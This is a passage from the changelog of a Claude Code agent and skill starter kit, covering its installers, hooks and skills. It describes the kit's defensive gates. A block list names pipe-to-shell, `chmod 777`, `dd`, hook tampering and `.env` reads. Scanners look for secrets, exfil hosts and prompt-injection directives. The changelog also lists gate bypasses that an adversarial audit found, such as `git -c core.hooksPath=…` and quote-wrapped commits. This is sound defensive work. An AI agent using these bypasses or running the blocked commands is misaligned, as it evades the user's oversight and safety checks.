- **The specialist agents now auto-delegate.** Claude Code routes to a subagent on its `description` field and only
  fires reliably when that description carries an action cue. The nine producing/auditing agents were rewritten to
  lead with "use proactively …" (with an inline carve-out for trivial edits); `commit-agent-csk` and
  `session-manager-csk` stay pull-only. The passive descriptions before this rarely auto-invoked, so the specialists
  stayed dormant and the kit read as inert.

## [1.4.4] - 2026-07-14

### Fixed
- **The settings self-heal now finds Python on Windows.** The merge looked only for `python3`, but a Git-Bash
  install commonly exposes Python only as `py` (the Windows Python Launcher) or `python` — so on those machines the
  updater fell through to the no-parser fallback and, for a project it misjudged, left a `settings.json.kit`
  reference instead of healing `settings.json`. The merge now probes `python3`, then `python`, then `py`, and uses
  whichever exists, so `/update-csk` heals cleanly via Python where jq is absent. Covered by an e2e leg that runs the
  merge with Python reachable only as `py`.

## [1.4.3] - 2026-07-14

### Fixed
- **The secret/trace commit gate was blind on Windows.** On an autocrlf (CRLF) checkout the pre-commit scanner read
  its blocklists with a trailing carriage return, so every pattern carried a `\r` and never matched the LF diff — a
  Windows user's commits weren't actually protected. The blocklist loops now strip a trailing `\r`, and
  `.gitattributes` pins the data files to LF. Verified on a Windows CI runner.
- **`/update-csk` now self-heals with no jq/python and no flags.** The settings merge previously required `jq` or
  `python3`; with neither (typical Windows Git-Bash) an update silently skipped it and left the hooks stale. A
  no-parser bash path now safely replaces a kit-only `settings.json` (a timestamped backup is kept), and a
  non-interactive update of an existing install applies by default — so a plain `/update-csk` refreshes the install
  end to end.

### Added
- **`--yes` flag on the updater** for non-interactive / CI runs, and a cross-platform CI matrix (Linux · macOS ·
  Windows) plus an e2e self-heal rehearsal, so the installer is proven on all three platforms.
- **Leaner npm README + broader keywords** for the package page (the rich README stays on GitHub).

## [1.4.2] - 2026-07-14

### Fixed
- **`/update-csk` no longer hangs.** The updater's final apply gate always read stdin, so off a controlling terminal
  — an agent's non-interactive shell — it blocked forever on an open, empty stdin instead of resolving. `/update-csk`,
  which runs the updater on the user's behalf, therefore hung mid-run. The prompt helper is now TTY-aware: it asks
  only on a real terminal, and off one it resolves without reading — `--yes` proceeds, otherwise it declines cleanly
  (nothing changes) rather than blocking.

### Added
- **`--yes` flag on the updater** (`adopt.sh` / `npx … update`) for non-interactive, agent-driven, or CI runs.
  `/update-csk` now invokes `npx @byerlikaya/claude-starter-kit@latest update --here --yes`, so an in-session update
  runs to completion; a user who wants to review each handover decision still runs the plain command in their own
  terminal. Covered by an e2e regression (no-hang · `--yes` applies · stale hooks refreshed · `CLAUDE.md` preserved).

## [1.4.1] - 2026-07-14

### Fixed
- **Updates now refresh the kit's own hooks.** The `settings.json` merge concatenated hook arrays, so on update a
  stale kit hook entry (e.g. an old `context-usage` hook with a short timeout) survived next to the refreshed one —
  the outdated one then timed out — and a genuinely new hook event (`SessionStart`) could be missed. The merge is now
  hook-aware: kit-owned hooks (any command referencing `.claude/hooks/`) are treated as authoritative, so current
  entries land, stale ones drop, and new events wire up, while the project's own custom hooks and permissions are
  preserved.
- **Settings merge no longer needs jq.** On machines without `jq` (common on Windows Git-Bash) the merge was skipped
  entirely, so updates never applied new hooks or corrected timeouts. A `python3` fallback with identical semantics
  now runs when `jq` is absent; if neither is present the kit's reference settings are written alongside for a manual
  reconcile instead of a silent skip. A smoke-test regression guard locks the hook-aware behaviour in.

## [1.4.0] - 2026-07-13

### Added
- **Four new skills.** `systematic-debugging` (root-cause a bug before touching a fix), `frontend-design` (visual/UX
  quality above architecture and a11y), `mcp-builder` (build a Model Context Protocol server), and `worktree`
  (isolate risky or parallel file-mutating work in a git worktree so uncommitted changes are never clobbered). 34 skills total.
- **Two slash commands.** `/update-csk` (version-check → update → verify with the doctor → prompt `/compact` to
  reload) and `/doctor-csk` (health-check a live install — hooks executable, `core.hooksPath` set, gates wired),
  backed by `eval/doctor.sh`.
- **The plugin edition now ships the tool-level gate hooks** (`guard-bash`, `guard-write`, `context-usage`,
  `session-guard`, `session-rehydrate`) via an auto-discovered `hooks/hooks.json` resolved through
  `${CLAUDE_PLUGIN_ROOT}`. The git-commit trace/secret/bloat scan still needs the full install.
- **Session rehydration.** A `SessionStart` hook re-surfaces `docs/SESSION_STATE.md` across a `/compact` or
  `/clear` boundary, completing the handoff → clear → resume loop.
- **adopt branch choice.** `--here` / `--new-branch` flags plus a smart default (first adopt → a review branch; a
  routine update whose `.claude/` is gitignored → the current branch; a tracked `.claude/` → ask).
- **Install-time supply-chain scan.** `eval/scan-skill.sh` scores a skill/agent file for red flags (pipe-to-shell,
  known exfil hosts, prompt-injection directives, credential-file reads); `adopt` runs it read-only over the
  project's existing (non-csk) skills/agents and surfaces any finding — advisory, never blocking.

### Changed
- **Progressive-disclosure retrofit** of eight skills — depth moved into `references/`, loaded on demand, to lower
  the on-invoke cost without touching the always-on budget.
- **Review rigor.** `code-review` gained a two-stage verdict (verify a finding before reporting it) and a named
  lens panel; `routing-eval` gained negative routing tests; `AGENT_TEMPLATE` documents a test-first workflow.
- **README** front-loads a Quick Start and collapses the agent table so install is visible in the first screen;
  counts refreshed to 34 skills.
- **Token hygiene.** A per-skill frontmatter ratchet and a cache-stable-ordering note. (Description trimming was
  deliberately not done — it would trade routing reliability for a marginal always-on saving.)
- `review-agent-csk` inherits the session model; every agent carries a `color`; CI uses `actions/*@v5` and
  validates the plugin manifest.

### Fixed
- **Security — tool-level gate bypasses (from an adversarial audit).** `guard-bash.sh` now uses one git matcher that
  catches `git -C …` / TAB separators, quote/backtick-wrapped `git commit`/`push`, `--force-with-lease`,
  `git -c core.hooksPath=…`, and the no-jq/no-python3 fallback — without over-blocking a commit whose message merely
  contains a subcommand word. Gate-tamper is matched by target path (interpreters, variable-indirected redirects,
  `.git/hooks`), so a guard hook cannot be silently rewritten. Reading a `.env` through the Bash tool is blocked.
- **`doctor.sh`** no longer reports "healthy" on a disarmed install — a missing git hook, an empty hook array, or a
  hook neutered to `exit 0` (caught by a behaviour probe) all fail.
- **`profiles.conf`** — a `--backend` install could ship `frontend-design` (a UI-only skill); it is now pruned.
- **Installer hygiene** — `start.sh` makes hooks executable via a glob so a hook added later is covered; kit-only
  smoke-test checks are guarded so an installed project (and the `e2e` rehearsal) pass.

## [1.3.0] - 2026-07-13

### Added
- **Six new tool-level gates.** The gate layer now covers more than commit/push approval and the existing
  destructive-op block:
  - **RCE / permission-nuke** — pipe-to-shell (`curl…|bash`), `chmod 777` and `dd of=` are hard-blocked in every
    permission mode (`guard-bash.sh`).
  - **Gate-tampering** — redirecting `core.hooksPath`, or editing/deleting a hook script, is blocked both from the
    shell (`guard-bash.sh`) and from the file tools (new `guard-write.sh` + a `Write|Edit` PreToolUse matcher). A
    gate you can silently remove is not a gate. `settings.json` stays editable so the `update-config` skill works.
  - **Repo-bloat** — build/vendored artifacts and blobs over 5 MiB are blocked at `pre-commit` (override via
    `CSK_MAX_FILE_BYTES`).
  - **Secret-file** — a file that is a secret by name (`.env`, `id_rsa`, `*.pem/.key/.p12`, `.npmrc`, …) is blocked
    at `pre-commit`; `.env.example`/`.sample`/`.template` stay committable.
  - **Force-add / lockfile deletion** — `git add -f` (bypasses `.gitignore`) and deleting a lockfile are blocked
    (`guard-bash.sh`).
  - **Default-branch warning** — committing straight onto `main`/`master` is surfaced in the approval prompt (a
    warning, not a block: a fresh project legitimately lives on `main`).
- **README "How this kit is different" section (EN + TR)** — a comparison against a typical prompt collection /
  agent kit, with the new gates added to the Rule → gate table.

### Changed
- **The update command is now documented for every channel (EN + TR).** Homebrew
  (`brew upgrade … && claude-starter-kit update`) and the release tarball (re-run `bash adopt.sh`) previously
  showed only fresh-install and adopt; the refresh path was spelled out for npx only.

### Fixed
- **`context-usage.sh` can no longer time out on a huge transcript.** A single pasted payload becomes one
  multi-MB JSONL record; the line-based `tail -n` then dragged the whole blob through the scanner (~1.4s for a
  60MB paste — over the 10s hook timeout on a slow Windows box with no `jq`). The tail is now bounded by bytes
  (256 KiB → 4 MiB), so the same case scans in ~12ms; when the record sits past the window the whole-file
  fallback runs only while the transcript is small enough to finish in time, and past a 200 MiB cap
  (`CSK_CONTEXT_MAX_BYTES`) it fails open — a missing measurement line is recoverable, a timed-out hook is not.

### Note
- The new `pre-commit` gates (repo-bloat, secret-file) can block operations that previously passed — committing
  `node_modules/`, a `.env`, or a large binary. That is intended; a genuine exception is escapable via
  `.secret-allowlist.txt`, `CSK_MAX_FILE_BYTES`, or an explicit `--no-verify` (§4.5).

## [1.2.2] - 2026-07-12

### Fixed
- **`planner-csk` inherits the session model instead of being pinned to `sonnet`.** The agent had drifted to
  `model: sonnet` while both READMEs documented `inherit`. Planning is the highest-leverage, read-only,
  once-per-feature step — its output steers every downstream producer agent — so it should run on the strongest
  model the user runs (`inherit` → Opus when Opus is the session model), not be capped below it. Cheap pins stay
  on the mechanical, high-frequency agents (`review`/`commit`/`session` on `haiku`). The READMEs were already
  correct; only the agent file changed.

## [1.2.1] - 2026-07-12

### Changed
- **`iterate` and `code-review` now prefer an external, machine-grounded verifier over LLM self-grading.** An exit
  test / acceptance check should rest on an objective signal (a test exit code, a schema match, a quality gate),
  not the model's own "looks done" or a lone "review clean" — a model grading its own output inflates. `iterate`
  says so at the exit-test step; `code-review` now flags any change that makes a check pass by *weakening the
  check* (loosening an assertion, lowering a threshold, editing the test instead of the code).
- **`token-budget` replaces the guessed "7×" figure with a measured subagent context cost.** Measured in a real
  transcript: a subagent's first turn is `cache_read=0` — context is built 100% fresh, nothing shared with the
  main thread (~10k tokens with restricted tools, ~16k with full tool access). Only the skill listing (~2.5–3k)
  is inherited by a subagent; the discipline (`DISCIPLINE.md`) and agent descriptions are not. The delegation
  threshold is reframed around that fresh-context floor: delegate for isolation, not to shave a few reads.

## [1.2.0] - 2026-07-12

### Added
- **`brainstorm` skill — divergent discovery before planning.** Turns a fuzzy, under-defined ask into 2–4
  distinct scoped options (including a deliberately minimal one) plus named blocking unknowns, converges to an
  explicit user choice, then hands the chosen direction to `spec-planning`. Wired as the pre-planning front-end
  of `planner-csk` and reachable via the new `/brainstorm` command. Bounded and gate-compatible — it asks with
  explicit options and never fills ambiguity by guessing.
- **`reflect` skill — retrospective self-audit.** After nontrivial work, a single bounded pass over unverified
  assumptions, silently-skipped items, whether the approach was right, and which "done/works" claims rest on
  observed evidence vs. inference. The step-back counterpart to `iterate`'s refine-to-done loop; produces
  findings, not code.
- **Panel mode in the `code-review` skill.** For high-stakes, hard-to-reverse decisions (architecture, a public
  API contract, a security boundary), evaluate the change from several independent adversarial lenses in
  parallel and synthesize their objections rather than averaging them. Reserved for high stakes; routine diffs
  keep the single-lens review.
- **A Turkish skill catalogue in `README.tr.md`.** The table's summaries are now Turkish, sourced from
  `packaging/skill-summaries.tr.tsv` — build-time data that is NOT part of the always-on payload, so the Turkish
  text spends no `SKILL.md` frontmatter byte budget.

### Changed
- **`build-readme-catalog.sh` generates each README in its own language.** English summaries still come from each
  `SKILL.md`; Turkish summaries come from the new TSV. The skill NAME set (the directory listing) drives both, so
  the two tables always hold the same rows in the same order. `--check` now also fails if any skill lacks a
  Turkish summary — a drift gate, already run in `ci.yml` and `release.yml`.
- **The skill-description byte budget in `smoke-test.sh` is raised 8500 → 9250.** The two new skills add ~660
  bytes of always-on frontmatter; the bump is deliberate and explicit, as the budget mechanism requires.
- Both READMEs (counts 28 → 30 skills, 5 → 6 commands, version and skill badges), the `CLAUDE.md` structure
  line, and the orchestration SVGs (`brainstorm → plan` in stage 1) reflect the additions.

## [1.1.12] - 2026-07-11

### Fixed
- **`smoke-test.sh` no longer fails an installed project for the user's OWN skills.** The "every skill declares
  Trigger phrases" check — like the byte budget — is a KIT convention; run inside a project it failed the user's
  own trigger-less skills, a pre-existing quirk that surfaced once adopt began importing taken-over agents. Both
  checks now GATE only in the kit repo and REPORT (a note, not a failure) in an installed project. Your project's
  own agents and skills are your call.

## [1.1.11] - 2026-07-11

### Changed
- **On takeover, `adopt` imports a taken-over agent's domain into an active project skill instead of only
  archiving it.** Before, the overlapping project agent was moved to `.claude/superseded/agents/` (inert), so its
  domain knowledge dropped out of the working setup. Now each taken-over agent is converted to a draft skill
  `skills/<name>-local` — its description and body carried over, a Trigger-phrases line added — which the kit's
  `-csk` agent applies (agent = who/when, skill = the how). The raw original is still backed up under
  `superseded/agents/`. The generated skill is a draft to refine.
- **The always-on byte budget now gates only the kit's payload, not an installed project.** In a project your own
  agents/skills (including the ones adopt imports) legitimately add to the always-on cost, so `smoke-test.sh`
  reports the numbers there instead of failing; it still fails in the kit repo. A CI e2e now runs the adopted
  project's own smoke-test to catch a malformed import.

## [1.1.10] - 2026-07-11

### Fixed
- **`adopt` could fail to open its handover branch when run twice in the same repo within one second.** The branch
  is named `kit-adopt-<timestamp>` at one-second resolution, so a second adopt in the same second collided with the
  first and `git checkout -b` failed. It now appends a counter until the name is free. This also surfaced as a flaky
  CI adopt e2e (the refresh scenario runs adopt twice); the fix makes it deterministic.

## [1.1.9] - 2026-07-11

### Changed
- **The "ask with options at a decision point" rule now demands a structured form.** The discipline already asked
  for options with a recommendation, but the wording ("present explicit options") let a model satisfy it with a
  prose "X, or Y?" question. It now reads "ask with numbered options (never an open-ended either/or), each with a
  recommendation" — so a decision is put as a clear multiple choice, not an open question. This is model discipline,
  not a tool-level gate (asking a question is plain text with no call to intercept), so it raises adherence rather
  than enforcing it.

## [1.1.8] - 2026-07-11

### Fixed
- **`adopt` can correct a stale `generic` stack on refresh.** A project adopted before the deeper stack detection
  (1.1.7) may carry `stack=generic` in `kit.conf` even though it is clearly DevArchitecture. A refresh trusts the
  recorded stack by design, so that stale value used to stick — keeping `devarch-module` pruned and the generic
  backend agent in place. adopt now notices the mismatch (recorded `generic` + a `Business/Handlers` + `.sln`
  layout), surfaces it, and offers to correct it to `dotnet`, which restores `devarch-module` and the .NET backend
  agent. It never flips silently; a CI e2e covers the correction.

## [1.1.7] - 2026-07-11

### Fixed
- **`adopt` misread a .NET project as generic when the solution lived under `./backend`.** The stack sniff only
  looked at the repo root (`ls ./*.sln`), so a DevArchitecture project with its `.sln` under `./backend` fell back
  to the generic backend and dropped the `devarch-module` pattern skill. It now searches a few levels deep, detects
  the DevArchitecture `Business/Handlers` layout, and on an interactive fresh adopt confirms the choice. The generic
  prune of `devarch-module` also applies to a fresh adopt now, so a generic project no longer carries a .NET pattern
  skill it never uses.

### Added
- **`adopt` resolves same-domain agent overlaps instead of only noting them.** When a project already has an agent
  covering the same job as a kit agent (e.g. `backend-expert` vs `backend-expert-csk`), the router had two candidates
  and usually picked the project's older one — so the kit's agent sat idle. adopt now detects the overlap and offers
  **takeover** (the kit's `-csk` wins; your agent is moved to `.claude/superseded/agents/`, preserved so you can fold
  its domain into a project skill), **keepmine** (your agent wins; the kit's overlapping `-csk` is not installed), or
  **coexist** (keep both, documented). A non-interactive adopt defaults to takeover. A CI e2e test locks down both the
  deeper stack detection and the overlap takeover.

## [1.1.6] - 2026-07-11

### Added
- **A skill catalogue in the README, generated from the skills themselves.** Readers can now see all 28 skills
  with a one-line summary of each — in a collapsible *Full catalogue* block — instead of a vague "and more".
  `packaging/build-readme-catalog.sh` builds the table from every `SKILL.md` frontmatter (the single source)
  and its `--check` mode fails CI and the release if the README drifts from the skills, so the count can never
  go stale again the way 27-vs-28 did. The table is English in both READMEs (skill names are English identifiers).

## [1.1.5] - 2026-07-11

### Changed
- **The backend expert is now pattern-neutral; DevArchitecture is the default, not the identity.**
  `backend-expert-csk` was branded "owner of the DevArchitecture pattern" with its layout, result types, and
  AOP order hardcoded — and the `--generic` stack shipped that same DevArch-branded agent, just without its
  skill. The agent now applies the project's **backend-pattern skill** — `devarch-module` (MediatR CQRS /
  IResult / AOP) by default; a project on another pattern (Clean Architecture, Vertical Slice, Minimal API,
  plain layered) declares its own pattern skill under `.claude/skills/` and the agent follows that instead.
  This restores the kit's own rule (agent = who/when, skill = how) and gives a coherent story for a backend
  that is not .NET/DevArchitecture. Nothing forces DevArch.
- `adopt.sh` infers a legacy project's stack from the presence of the `devarch-module` skill instead of
  grepping the agent text (no longer a reliable signal). The template `CLAUDE.md`, the `devarch-module` skill,
  and the `start.sh` generic wizard now document the pluggable-pattern story.

## [1.1.4] - 2026-07-11

### Added
- **`iterate` skill — a bounded refine-to-Done loop.** Names the discipline the kit already leaned on:
  don't stop at the first attempt, repeat change → verify → check until the acceptance criterion is
  objectively met (tests green, review clean, nothing deferred), reporting the gap each round and stopping
  after two rounds with no progress. Distinct from the harness `/loop` (which schedules a prompt on an
  interval); it never commits, pushes, or deploys on its own — §4.4 approval still gates the commit — and it
  keeps to the token discipline. Reaches full installs and the plugin edition (both ship `skills/`).

## [1.1.3] - 2026-07-11

### Changed
- **`review-agent-csk` is now named in the Definition of Done, not only in the Close flow.** The Close phase
  already gated a commit on a clean review, but the DoD checklist the model measures "am I done?" against did
  not list it — so on a logic-bearing change "commit directly" could surface as a peer option to reviewing. It
  now sits on the Done line beside tests-green and the triggered skills. (Reaches full installs via
  `start.sh` / `adopt.sh`; the plugin-lite edition ships no discipline, so it is unaffected.)

## [1.1.2] - 2026-07-11

### Fixed
- **The session-fill hook timed out on Windows, so the measured `🔋 Session` line never reached the model.**
  `context-usage.sh` scanned the whole transcript on every turn, though the only record it needs — the last
  main-context turn's usage — sits 1–3 lines from the end of the file (43 at worst across 71 real transcripts).
  Stock Git Bash on Windows ships no `jq`, so the slower `awk` path runs: on a 180 MB transcript it took ~4.7 s,
  and with MSYS fork cost and a cold Defender scan it blew the hook's 10 s ceiling. The hook was killed and its
  output discarded, so context fill could not be measured. It now reads the tail (`tail -n 200`, widening to
  `2000`, then the whole file only as a fallback); a window too small to contain the record can only come back
  empty, never stale. Same number as before — measured byte-identical across 71 transcripts on both engines — at
  ~40 ms instead of 4.7 s.
- **On the `jq`-less path a returning subagent's usage was read as the session's own fill.** When a subagent
  returns, its result lands in the main context as a `type:"user"` record whose `toolUseResult.usage` is raw,
  unescaped JSON. The `awk` text-scan matched it and reported the *subagent's* tokens: a 92%-full context showed
  0.9% → "continue", so the 75%/90% handoff gate stayed silent exactly when it mattered — reachable by
  interrupting a subagent. Both engines now require `"type":"assistant"`, which the raw sub-record cannot satisfy;
  `jq` was already anchored at `.message.usage` and unaffected. Verified against a reproduction of the exact bug.
- **The three hook timeouts move from 10 s to 30 s** — Claude Code's own documented default for a
  `UserPromptSubmit` hook, which the kit had set *below*. On the success path the tailed script returns in well
  under 100 ms; the raised ceiling only absorbs a cold-disk worst case, and a timeout never blocks the prompt
  itself. `smoke-test.sh` §6i locks down the tail ladder, the anchor, and the poison case on both engines.

## [1.1.1] - 2026-07-10

### Fixed
- **The `pre-commit` scanners went blind on a large staged diff.** Both scanners fed the added lines to `grep -q`
  through a pipe. `grep -q` exits on its first match, the pipe closes, `printf` dies of `SIGPIPE` (141), and
  `set -o pipefail` turns that into a failed `if` — so a match counted as no match. Small commits were scanned;
  large ones were not, and an AI-authorship trace or a live secret sailed through silently. Reproduced: a JWT in a
  20,000-line staged diff was committed with no warning. The added lines now go to a temp file and every pattern
  greps that file, so no pipe can close early. `smoke-test.sh` locks it down.
- **A project that shares `.claude/` could not commit it.** `adopt.sh` offers to track `.claude/` so a team shares the
  kit, but the trace scan then found the tool's name inside the kit's own scripts and blocked the commit — the kit
  failed its own rule. The trace scan now skips `.claude/`: that tree configures the assistant, legitimately names
  the tool it configures, and an update overwrites it. **The secret scan still covers `.claude/`** — a token pasted
  into `settings.json` is still a token. §4.3 no longer claims `.claude/` is always local.
- **An update that lands while a session is running is now announced.** `CLAUDE.md` and the discipline it imports are
  read once, at session start. Updating the kit mid-session replaced every file on disk while the rules already in the
  model's context stayed at the previous version — so the assistant kept quoting rules that no longer existed (for
  example, telling you to set `CLAUDE_GIT_OK=1` long after the commit gate had learned to ask you directly), and
  nothing said otherwise. `context-usage.sh` now stamps `.claude/VERSION` on the session's first turn, compares it on
  every later turn, and injects `⚠️ kit updated X → Y mid-session` until the session is restarted. It fails open: no
  stdin, no `session_id` or no `VERSION` means silence, and it never fires on the `Stop` payload `session-guard.sh`
  pipes through the same script.
- `start.sh` and `adopt.sh` close by telling you to restart Claude Code if it is already open in the project.

## [1.1.0] - 2026-07-10

### Added
- **In-session commit approval.** `guard-bash.sh` answers `PreToolUse` with `permissionDecision: "ask"`, so you approve
  `git commit` / `git push` at a prompt only you can answer and the assistant then runs it — instead of the gate
  handing you a command to paste into your own terminal. Verified honoured in `default`, `acceptEdits`, `auto` and
  `dontAsk`; `bypassPermissions` and any unrecognised mode **fail closed**. `CLAUDE_GIT_OK` remains a headless/CI
  pre-authorisation and never substitutes for approval. §4.5 destructive operations stay a hard block in every mode.
- **`.claude/kit.conf`** records the profile, backend stack and installer. The updater refreshes a project in the shape
  it was installed in, and derives that shape from the installed files when the stamp is absent.
- **`claude-starter/profiles.conf`** — one source for the profile → pruned agents/skills map, read by both installers.
- **`.claude/DISCIPLINE.md` + `@import`.** `start.sh` now installs the discipline as a separate kit-owned file, joined
  to your `CLAUDE.md` by one import line, so discipline updates reach installed projects. `adopt.sh` detects an inline
  (pre-`DISCIPLINE.md`) layout, shows which lines it occupies, and offers to migrate it after writing a backup.
- **Second session warning at 90%**, on top of the one at 75%.
- **Always-on token budget gate.** `smoke-test.sh` fails when the discipline or the agent/skill descriptions exceed
  their byte budget, and asserts every agent and skill still declares its trigger phrases.
- **`context-usage.sh --verbose`** for the long form with raw token counts.

### Changed
- The `Stop` hook no longer blocks with `exit 2`. It emits a `systemMessage` once per threshold, so it neither renders
  as `Stop hook error` nor forces an extra assistant turn on every reply past 75%.
- The line injected into context each turn is compact; `--verbose` keeps the long form.
- Discipline and agent/skill descriptions trimmed from 11,205 to 9,198 tokens (measured on a real turn). Rules and
  trigger phrases are untouched; only explanations of rules a hook already enforces were compressed.
- §4.4 in `CLAUDE.md` corrected: the hook does receive `permission_mode`, and `settings.json` carries no `deny` rule
  for git — the gate is the hook.

### Fixed
- `adopt.sh` split `CLAUDE.md` on `<PROJE ADI>`, a marker that stopped matching once the payload was translated to
  English, so `DISCIPLINE.md` swallowed the whole file including the project template. The split now uses an anchored
  `KIT:DISCIPLINE-END` sentinel and both installers abort if it is missing.
- The `@import` check matched the path anywhere in the file, including prose, so a `CLAUDE.md` that merely mentioned
  `.claude/DISCIPLINE.md` never got the import — and never loaded the discipline.
- Refreshing a `--backend` project re-added the frontend agents (10/24 → 11/27), and a `--dotnet` project had its
  DevArchitecture backend expert replaced by the generic variant.
- `context-usage.sh`'s no-jq fallback counted sidechain (subagent) records and summed only `cache_read`, producing a
  percentage that was both understated and polluted.
- Every `awk` is pinned to `LC_ALL=C`; a `tr_TR` locale emitted `%77,2` into the threshold comparison.
- The installers strip `CR`, so a CRLF checkout of `profiles.conf` or `kit.conf` can no longer silently disable
  profile pruning.

## [1.0.9] - 2026-07-08

### Changed
- **Surfaced `FIRST_PROMPT.md`:** `start.sh`'s closing message and the README now point to `.claude/FIRST_PROMPT.md`
  — the optional first-message kickoff that verifies the agents/skills and plans the first sprint. It was installed
  but never referenced anywhere, so it looked like an unexplained stray file.

## [1.0.8] - 2026-07-08

### Fixed
- **Windows launch made robust (Git Bash + WSL):** the `npx` runner now (a) prefers **Git Bash** if installed —
  it accepts `C:/…` paths natively and avoids WSL's `/mnt/c` and 8.3-name pitfalls; (b) expands 8.3 short paths
  (`…\LONGNA~1.DEV\…`) before staging; and (c) under WSL translates the Windows path to `/mnt/c/…` inside bash,
  dispatched by shell flavour. If the staged script still can't be read it now fails with an actionable message
  instead of a cryptic "No such file or directory". macOS/Linux run unchanged (no path rewriting).
- Shell scripts pinned to LF via `.gitattributes` so a Windows checkout can't flip them to CRLF.

## [1.0.7] - 2026-07-08

### Fixed
- **Windows (Git Bash) launch:** `npx` passed a native Windows path (`C:\Users\…\start.sh`) to bash, which treats
  `\` as an escape — so the path separators were lost and the script wasn't found ("No such file or directory").
  The runner now hands bash a forward-slash path (`C:/Users/…/start.sh`), which Git Bash resolves. macOS/Linux unaffected.

## [1.0.6] - 2026-07-08

### Added
- **Secret-scan gate:** `pre-commit` now also blocks staged **API keys / tokens / private keys** (AWS, GitHub,
  Google, Slack, Stripe, OpenAI/Anthropic, npm, SendGrid, JWT, and PEM private keys) — the same
  diff → pattern → block machinery as the trace scanner, with a repo-root `.secret-allowlist.txt` for exceptions
  and a smoke-test proof that a staged key is blocked. Prints the matched pattern, never the secret value.

## [1.0.5] - 2026-07-08

### Changed
- **Agent namespace `-cck` → `-csk`** (Claude Starter Kit) to match the project name — all 11 agents and every
  reference across the kit, plugin, and diagrams.
- **`update.sh` renamed to `adopt.sh`** so the tarball's entry point matches the `adopt` command that npx and Homebrew already use.
- **README refresh:** the title is now "Claude Starter Kit"; "Why this kit?" leads with standout features (a team,
  not a prompt · security & privacy gates); the agents table and the handover diagram were clarified; attribution
  was folded into the README (the four-principles source credited) and `ATTRIBUTION.md` removed.

## [1.0.4] - 2026-07-08

### Changed
- **`adopt.sh` (adopt) leaves the change set STAGED, not committed:** the kit files land on the handover branch
  staged-but-uncommitted, so every added/changed file is visible in your editor's Source Control / Changes panel
  for review. You commit to accept (`git commit`) or discard with one reset — nothing is buried in an auto-commit.
  (Previously everything was auto-committed on the branch, so a developer saw nothing in the Changes view.)

### Fixed
- **Trace scanner no longer trips over its own pattern list:** `pre-commit` excludes `.claude/hooks/trace-blocklist.txt`
  from the scan (it definitionally contains every pattern), so a shared/tracked `.claude` can be committed without
  the scanner blocking on its own blocklist. Real AI traces in project files are still caught.

## [1.0.3] - 2026-07-08

### Fixed
- **`adopt.sh` (adopt) re-run was unsafe:** running adopt on an already-adopted project made the git-shim
  reference itself → infinite recursion on every commit. Adopt now detects a prior install (**REFRESH mode**),
  never shims its own hooks, refreshes kit-owned files, and excludes the kit's `-csk` agents/skills from the
  "project" counts (the earlier "N custom agents" over-count).
- **Confusing decision override:** the number-picker (`[1-4,6,7]`) that silently rejected lists like `1,2,3`
  and swallowed invalid answers is replaced by "Accept all suggestions? [yes/no]" then a per-decision walk that
  shows the current value, treats ENTER as keep, and re-asks on invalid input.
- **`#4 hide` broke review/rollback:** it gitignored `.claude` before the branch commit, so the payload was
  absent from the diff and survived rollback. The payload is now always committed to the review branch; hide
  becomes a documented post-merge step in HANDOVER.
- Precedence (`#2`) is fixed to project-wins (no longer a no-op that could write a contradictory HANDOVER);
  the non-.NET backend swap no longer clobbers a preserved file; PROOF-1 measures the scanner (not the
  project's allowlist) and matches the current hook output; HANDOVER/ADR use the real base branch, not literal `main`.
- **Remaining Turkish removed from public surfaces:** the CI workflow's job/step names and the generated ADR
  filename (now `docs/adr/0001-agentic-kit-adoption.md`) are English.

## [1.0.2] - 2026-07-08

### Changed
- **Fullstack layout:** on `--fullstack` + `--dotnet`, the DevArchitecture backend is now placed in `./backend`
  (was the project root) and `./frontend` is reserved for the frontend — the root no longer looks like a bare
  backend project. The solution file is renamed to the project's name (taken from the directory); the full
  namespace rename stays the agent's first task (§4.2).

## [1.0.1] - 2026-07-08

### Added
- **`devops-expert` agent (11th)** — ops/devops specialist; owns the `ci-pipeline` · `vps-deploy` · `incident-runbook`
  skills (these skills are no longer orchestration-only). Core (in all profiles). Produced with a design panel plus
  4-lens adversarial verification.
- **Deploy tool-level gates:** `ssh`/`scp`/`rsync`/`docker` added to `permissions.ask` in `settings.json` —
  outward-facing deploy verbs now hit approval at the tool level (not just at the LLM behavior level).

### Fixed
- **Confirmation prompt rejected `yes`:** `ask_yes` (`start.sh`/`adopt.sh`) only accepted `evet/e/y`, so typing
  `yes` at the English `[yes/no]` prompt cancelled the install. Now accepts `yes/y/evet/e`.
- **`adopt.sh` decision keys were Turkish:** the Stage-B override labels and internal keys (koru/gevset/gizle…)
  are now English (keep/loosen/hide…), with matching input letters.
- **Auto-rollback conflict:** `vps-deploy` rollback uses an atomic `rsync --delete` instead of `rm -rf`,
  so `guard-bash` (its local `rm -rf` block) no longer blocks automatic rollback (local rm -rf protection remains).

### Changed
- **Distribution + English:** the kit was fully translated to English (with a `README.tr.md` mirror) and is now
  distributed via npm (`@byerlikaya/claude-starter-kit`), Homebrew (`byerlikaya/tap/claude-starter-kit`), and a
  Claude Code plugin; a tagged release publishes to all three automatically.
- npm `bin` exposes only `claude-starter-kit` (dropped the `claude-kit` alias) for name consistency.
- `privacy-agent` and `privacy-compliance`: the official KVKK (kvkk.gov.tr) and GDPR (gdpr-info.eu) sources
  were added as authoritative references; rule interpretation always follows these channels, and the article relied upon is stated in the finding.
- **Skill ownership clarified:** domain skills were explicitly bound to their owning specialist agents (backend-expert →
  api-design/observability/performance/dependency-audit/i18n-integrity; frontend-expert → a11y/i18n/observability/
  performance/dependency-audit; security-expert → red-team; review-agent → docs-writer; planner → adr;
  commit-agent → release; session-manager → token-budget). `i18n-integrity` was made **core** (the backend also
  produces user-facing text). Only the hook/ops skills (trace-scan, ci-pipeline, vps-deploy,
  incident-runbook) were deliberately kept orchestration-owned.

## [1.0.0] - 2026-07-03

First stable release. A Turkish, opinionated-but-backend-optional agent/skill scaffold.

### Added
- **10 agents** (thin triggers) + **27 skills** (the discipline layer: code review, security, database,
  deployment, observability, documentation, accessibility, api design, performance, incident response,
  red-team, i18n, privacy, release, and more).
- **Profiled setup wizard** (`start.sh`): `--backend/--frontend/--mobile/--fullstack` +
  backend stack `--dotnet` (full DevArchitecture) / `--generic` (stack-agnostic). Interactive when no flag is given.
- **DevArchitecture backend foundation**: included verbatim behind an approval gate in a from-scratch project; a warning in an existing project.
- **Rule→gate**: trace scan (`pre-commit`/`commit-msg` + repo-specific `.trace-allowlist.txt`), `guard-bash.sh`
  destructive block, `settings.json` permission gates.
- **Real context measurement**: `context-usage.sh` reads the actual fill from the transcript; the `UserPromptSubmit`
